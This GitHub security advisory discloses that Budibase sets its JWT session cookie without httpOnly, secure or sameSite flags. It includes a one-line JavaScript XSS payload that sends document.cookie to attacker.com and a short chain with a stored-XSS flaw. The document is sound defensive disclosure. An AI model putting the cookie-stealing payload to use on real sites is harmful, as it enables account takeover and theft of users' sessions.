# [H] Budibase auth session cookies are set with httpOnly:false — any XSS can lead to full account takeover

## Summary
Severity: High
Advisory: GHSA-4f9j-vr4p-642r
CVE: CVE-2026-42239
CWE: CWE-1004
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:C/C:H/I:H/A:N (CVSS_V3)
Published: 2026-04-24
Source: https://github.com/advisories/GHSA-4f9j-vr4p-642r
Type: github-advisory

## Affected
- npm: `@budibase/backend-core` — affected >=0 <3.35.10

## Details
### Summary

The `budibase:auth` cookie containing the JWT session token is set with `httpOnly: false` at `packages/backend-core/src/utils/utils.ts:218`. JavaScript can read this cookie via `document.cookie`. Given that Budibase has had XSS vulnerabilities (GHSA-gp5x-2v54-v2q5 — stored XSS via unsanitized entity names, published April 2, 2026), this means every XSS becomes a full account takeover — the attacker steals the JWT and has persistent access to the victim's account.

The cookie also lacks `secure: true` (sent over plaintext HTTP) and `sameSite` attribute.

### Details

`packages/backend-core/src/utils/utils.ts`, lines 215-226:

```typescript
const config: SetOption = {
  expires: MAX_VALID_DATE,
  path: "/",
  httpOnly: false,     // ← JavaScript can read the session JWT
  overwrite: true,
}

if (env.COOKIE_DOMAIN) {
  config.domain = env.COOKIE_DOMAIN
}

ctx.cookies.set(name, value, config)
```

This function is called for setting the `budibase:auth` cookie which contains the signed JWT session token. With `httpOnly: false`, any JavaScript execution context (XSS, injected script, browser extension) can read the token via `document.cookie`.

Missing flags:
- `httpOnly: false` → should be `true` (prevent JS access)
- No `secure` flag → cookie sent over HTTP (should be `secure: true` for HTTPS deployments)
- No `sameSite` → susceptible to cross-site request attachment (should be `sameSite: 'lax'`)

### PoC

Any XSS payload can steal the session:

```javascript
// Attacker's XSS payload — steals session and sends to attacker server
new Image().src = 'https://attacker.com/steal?cookie=' + encodeURIComponent(document.cookie);
```

With `httpOnly: true`, this payload would get an empty string for the auth cookie. Without it, the full JWT is exfiltrated.

Combined with GHSA-gp5x-2v54-v2q5 (stored XSS in entity names), an attacker could:
1. Create an entity with a name containing `<script>` payload
2. Any user who views that entity has their JWT stolen
3. Attacker uses the JWT for persistent account access

### Impact

Every XSS vulnerability — past, present, and future — becomes a full account takeover. The `httpOnly` flag is the primary defense that limits XSS impact to the current session/page. Without it, XSS escalates from "session riding" to "persistent credential theft."

This affects all Budibase deployments since the cookie configuration is hardcoded.

## ATTACHMENTS

[BUDIBASE-TOP10-REPORT.md](https://github.com/user-attachments/files/26508656/BUDIBASE-TOP10-REPORT.md)

---

## References
- https://github.com/Budibase/budibase/security/advisories/GHSA-4f9j-vr4p-642r
- https://nvd.nist.gov/vuln/detail/CVE-2026-42239
- https://github.com/Budibase/budibase
- https://github.com/Budibase/budibase/releases/tag/3.35.10
